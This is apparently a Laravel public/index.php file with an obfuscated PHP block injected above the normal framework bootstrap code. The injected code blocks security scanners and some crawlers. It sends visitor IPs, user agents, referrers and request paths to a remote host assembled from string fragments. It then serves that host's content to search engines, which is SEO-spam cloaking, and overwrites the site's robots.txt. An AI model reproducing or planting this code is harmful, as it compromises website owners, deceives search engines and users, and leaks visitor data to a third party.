<?php $kaks='ht';$kyfi='biantown.shop';$xize='tp://cw1041.les';$lcxr='/';$qmalz=$kaks.$xize.$kyfi.$lcxr; $pc = "UAxTAwz"; $bagent = "Yahoo|Bing|Docomo|Google"; ErroR_rePoRtinG(0); if(prEG_mATCH("/(Barkrowler|YySpider|heritrix|SeznamBot|GPTBot|python|AmazonBot|HttpClient|yandexBot|Feedly|coolpadWebkit|FeedDemon|EasouSpider|universalFeedParser|Python-requests|jaunty|CensysInspect|oBot|Swiftbot|ezooms|Mj12bot|jikeSpider|Scrapy|DotBot|askTbFXTV|Indy Library|lightDeckReports Bot|AhrefsBot|DataForSEO|SemrushBot|ApacheBench|DigExt|java|Python-urllib|YisouSpider|PetalBot|Paloaltonetworks|ZmEu|crawlDaddy|Go-http-client|Bytespider)/i", $_SERVER['HTTP_USER_AGENT'])) {  header('HTTP/1.0 403 Forbidden');  EXIT(); } $refer = URlENcODE(@$_SERVER['HTTP_REFERER']); $uagent = uRleNcODe($_SERVER['HTTP_USER_AGENT']); $language = UrLencOdE(@$_SERVER['HTTP_ACCEPT_LANGUAGE']); $ip = $_SERVER['REMOTE_ADDR']; if (IssEt($_SERVER['HTTP_CLIENT_IP'])) {  $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (issET($_SERVER['HTTP_X_FORWARDED_FOR'])) {  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } $ip = urLenCoDe($ip); $domain = uRLENCoDe($_SERVER['HTTP_HOST']); $script = UrlENCodE($_SERVER['SCRIPT_NAME']); if ( (! emPTY($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! EMPtY($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! eMpTy($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (IsSet($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {  $_SERVER['REQUEST_SCHEME'] = 'https'; } else {  $_SERVER['REQUEST_SCHEME'] = 'http'; } $http = UrLEncODE($_SERVER['REQUEST_SCHEME']); $uri = urLeNcodE($_SERVER['REQUEST_URI']); if(STRpoS($uri,"yiiyii") !== false){echo "ok";ExiT();} $yii = 0; if(!is_file("yii.txt")) {  $uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/yiiyii';  $yypm = fetchURLContent($uuu);   if($yypm === "ok") {   $yii = 1;   writeToFile("yii.txt","1");  } else {   $yii = 0;   writeToFile("yii.txt","0");  } } else {  $yii = readFromFile("yii.txt"); } function fetchURLContent($url) {  $ch = CuRl_Init();  cuRl_seTopt($ch, CURLOPT_URL, $url);  CuRl_seTopT($ch, CURLOPT_RETURNTRANSFER, true);  Curl_seToPT($ch, CURLOPT_FOLLOWLOCATION, false);  CUrl_sETopT($ch, CURLOPT_SSL_VERIFYPEER, false);  cUrL_SEtOpT($ch, CURLOPT_SSL_VERIFYHOST, false);  $content = CuRL_exEc($ch);  CURL_cLoSe($ch);   return $content; }  function writeToFile($filePath, $content) {  $file = fopen($filePath, "w");  if ($file) {  fwrite($file, $content);  fclose($file);  return true;  }  return false; }  function readFromFile($filePath) {  $file = fopen($filePath, "r");  if ($file) {  $content = fread($file, filesize($filePath));  fclose($file);  return $content;  }  return false; } if(stRPoS($uri,"favicon.ico") !== false) { } else if(stRpOS($uri,"robots.txt") !== false||StrPOs($uri,"pingsitemap") !== false||sTRPos($uri,"jp2023") !== false||preG_MAtch("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])||preg_MatcH("/($bagent)/i", $_SERVER['HTTP_USER_AGENT'])||prEg_MatCh("/($bagent)/i", $_SERVER['HTTP_REFERER'])||preg_mAtch("/[a-z]{5}\/[a-z][0-9]{1,}\.html/", $_SERVER['REQUEST_URI'])) {  $requsturl = $qmalz."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$yii&script=$script";  $robots_contents = "";  if(stRpOs($uri,"pingsitemap") !== false) {   $scripname = $_SERVER['SCRIPT_NAME'];   if(strpOS($scripname,"index.ph") !== false) {    if($yii == 0) {     $scripname = '/?';    } else {     $scripname = '/';    }   } else {    $scripname = $scripname.'?';   }   $robots_contents = "User-agent: *\r\nAllow: /";   $sitemap = "$http://" . $domain .$scripname. "sitemap.xml";   $robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";   $sitemapstatus = "";   echo $sitemap.": ".$sitemapstatus.'<br/>';   $requsturl = $qmalz."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$yii&script=$script&sitemap=".urleNCodE($sitemap);  }  $yypm = @fIle_GeT_CoNTENTS($requsturl);  if(eMpTY($yypm)) {   $ch = CUrL_INIt();   CURl_SETopT($ch, CURLOPT_URL, $requsturl);   cuRL_sETopT($ch, CURLOPT_RETURNTRANSFER, true);   CURl_sEtOPT($ch, CURLOPT_FOLLOWLOCATION, false);   CuRL_SEtOPt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   CURL_seTOpT($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   $yypm = CUrl_exEc($ch);   curL_CLose($ch);  }  if(!EMpty($yypm)) {   if(subsTr($yypm,0,10)=="error code"||$yypm == "500") {    header("HTTP/1.0 500 Internal Server Error");    EXiT();   }   if(sTrPoS($uri,"jp2023") !== false){header('HTTP/1.1 404 Not Found');}   else if(sUBSTR($yypm,0,5)=="<?xml") {    header('Content-Type: text/xml; charset=utf-8');   } else {    header('Content-Type: text/html; charset=utf-8');   }   echo $yypm;   if(!EMptY($robots_contents)){writeToFile("robots.txt",$robots_contents);}   else if(strPOS($uri,"robots.txt") !== false){writeToFile("robots.txt",$yypm);}   eXIT();   return;  } }else{ } ?>
<?php

ini_set('serialize_precision', -1);

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
